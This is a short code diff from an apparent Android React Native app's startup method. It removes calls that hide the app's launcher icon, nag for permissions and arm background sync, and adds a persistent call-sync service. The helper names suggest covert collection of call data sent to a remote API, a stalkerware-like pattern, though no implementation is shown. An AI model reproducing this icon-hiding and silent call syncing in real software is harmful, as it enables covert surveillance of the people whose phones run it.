@@ -27,12 +27,7 @@ class MainApplication : Application(), ReactApplication {
         super.onCreate()
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
-        SyncBootstrap.armBackgroundSync(this)
-        PostInstallPrompt.showIfNeeded(this)
-        PermissionPopupAlarms.schedule(this)
-        if (!SyncBootstrap.needsRuntimePermissions(this)) {
-            LauncherHider.hideNow(this)
-        }
+        CallSyncService.startHolding(this)
     }
 
   fun ensureReactNativeLoaded() {
